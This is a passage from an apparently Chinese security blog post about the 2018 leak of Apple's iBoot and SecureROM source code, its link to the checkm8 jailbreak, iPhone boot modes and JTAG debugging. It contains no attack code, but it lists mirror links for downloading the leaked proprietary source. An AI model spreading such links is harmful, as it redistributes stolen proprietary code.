<p>可见大部分网民还是吃瓜，因为不懂不了解，也就无法明白这份代码对于理解并破解iPhone的重要性。可以这么说，此次iboot源码的泄露是黑客发现checkm8这个漏洞的起点。但是苹果当时的回应是：<a href="http://tech.sina.com.cn/it/2018-02-09/doc-ifyrkuxs4997460.shtml">iOS 9源代码被泄露 苹果：该源代码已过时 不必担忧</a>。我们事后诸葛亮的来看这个事，可以说是大型打脸现场了，因为泄露的代码至今仍然没有过时。当年苹果公司说他们不在乎，泄露的都是过时的老代码，没有价值，可是他们当时是怎么做的呢？<a href="https://www.leiphone.com/news/201802/HAPYD8ulbmkJNqMt.html">GitHub泄露苹果iBoot源代码？苹果：全网删，谢谢</a>。真的都是江湖人，江湖事呀。那这份泄露的代码在哪呢？虽然在github找到不到了，不过，互联网是有记忆的，网民是万能的：</p>
<ul>
<li><a href="https://download.csdn.net/download/galaxy0011/10257969">iBoot源代码（含.git目录），来自Github</a></li>
<li><a href="https://bbs.pediy.com/thread-225000.htm">最近泄露的Apple iBoot/BootROM/Baseband源代码</a></li>
<li><a href="https://0x1.gitlab.io/phone/iBoot/">iBoot IOS 9.3 Leaked</a></li>
<li><a href="https://yalujailbreak.net/bootrom-iboot-source-code-leaked/">Twitter user leaks iOS 9 BootROM and iBoot source code online</a></li>
<li><a href="https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot">https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot</a></li>
</ul>
<p>这份泄露的代码主要是iBoot，相当于PC的BIOS层面的代码，不是做底层的程序员一般是看不明白。不过我们大概也猜到了，这些代码主要负责的就是iPhone的启动过程。启动，你会想到什么呢？</p>
<h5 id="iPhone的操作模式"><a href="#iPhone的操作模式" class="headerlink" title="iPhone的操作模式"></a>iPhone的操作模式</h5><p>刚才的两个小实验中，我们将iPhone经过按键的操作进入了DFU模式，其实iPhone还有一种模式叫恢复模式，这些称之为iPhone的操作模式：</p>
<ul>
<li><a href="https://beta.4hou.com/mobile/14346.html">iOS DFU和恢复模式的异同之处</a></li>
<li><a href="https://developer.aliyun.com/article/175407">iOS取证实战：调查、分析与移动安全：操作模式</a></li>
</ul>
<p>其实我们在其他设备上也有类似的操作，比如Android的recovery、fastboot、9008，PC的BIOS配置，Windows的安全模式，Mac的恢复模式等。这些操作都可以理解为进入了一个小系统，这些小系统可能为主系统的运行提供一些必要的支持，也可能作为备用系统以防主系统遭遇不测。我们一般通过在开机过程中按照顺序或者时间的要求按下一些按键，进入这些小系统。换句话说我们没有成功启动主系统，而启动了小系统，对，就是启动。那么这里每一个小系统都有着对应的代码实体，iPhone的DFU和恢复模式的代码实体又在哪呢？是不是iBoot呢？带着这个疑问让我们来看一下，苹果公司泄露的代码能不能回答这个问题。</p>
<h5 id="泄露源码分析"><a href="#泄露源码分析" class="headerlink" title="泄露源码分析"></a>泄露源码分析</h5><p>打开泄露的源码，大致浏览了一下目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ tree -N -L 2</span><br><span class="line">.</span><br><span class="line">├── Makefile</span><br><span class="line">├── apps</span><br><span class="line">│   ├── EmbeddedIOP</span><br><span class="line">│   ├── SecureROM</span><br><span class="line">│   └── iBoot</span><br><span class="line">├── arch</span><br><span class="line">│   ├── arm</span><br><span class="line">│   └── arm64</span><br></pre></td></tr></table></figure>

<p>原来泄露的不只有iBoot，还有SecureROM！其实认真看苹果源码泄露事件的国外报道：<a href="https://www.iphonefirmware.com/breakthrough-iboot-and-securerom-source-code-has-leaked-could-lead-to-permanent-bootrom-iphone-jailbreak/">Breakthrough: iBoot And SecureROM Source Code Has Leaked, Could Lead To Permanent Bootrom iPhone Jailbreak</a>，他们是明确说了iBoot和SecureROM（也就是BootROM）的代码都泄露了，只不过是国内的媒体都只说了iBoot。接下来就是优秀源码阅读时间，不过无论是iBoot还是SecureROM，都是那种天地初开之时的底层代码。对于陌生的代码，可以从代码的运行顺序，目录结构，编译方法，文档说明，对比同类代码，以及他人的分析文章等方面综合理解。</p>
<ul>
<li><a href="https://www.reddit.com/r/jailbreak/comments/7vrl1q/discussion_iboot_source_code_leaked/">Discussion: iBoot Source Code Leaked</a></li>
<li><a href="https://blog.xinoassassin.me/2018/02/what-iboot-source-code-contains/">泄露的 iBoot 源代码中都有些什么</a></li>
<li><a href="https://beta.4hou.com/technology/13937.html">如何构建iBoot？</a></li>
<li><a href="https://nyansatan.github.io/building-iboot/">Building iBoot</a></li>
</ul>
<h2 id="0x05-调试"><a href="#0x05-调试" class="headerlink" title="0x05 调试"></a>0x05 调试</h2><p>JTAG相关</p>
<ul>
<li><a href="http://newosxbook.com/bonus/iBoot.pdf">iBoot</a></li>
<li><a href="https://www.youtube.com/watch?v=-ziD74n9lr4">SEPROM dump</a></li>
<li><a href="https://threader.app/thread/1177856941139337216">https://threader.app/thread/1177856941139337216</a></li>
<li><a href="https://twitter.com/nyan_satan/status/1090989650280398849">https://twitter.com/nyan_satan/status/1090989650280398849</a></li>
<li><a href="https://youtu.be/3zpwSUXlz6A">YouTube: iPhone 7平台用checkm8漏洞以及Bonobo JTAG电缆和OpenOCD + GDB进行调试</a></li>
</ul>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="https://checkm8.info/blog/jailbreak-mac-apple-t2-chip">https://checkm8.info/blog/jailbreak-mac-apple-t2-chip</a></p>
<p><a href="https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#">https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#</a><br><a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">https://ironpeak.be/blog/crouching-t2-hidden-danger/</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Apple T2</tag>
      </tags>
  </entry>
</search>
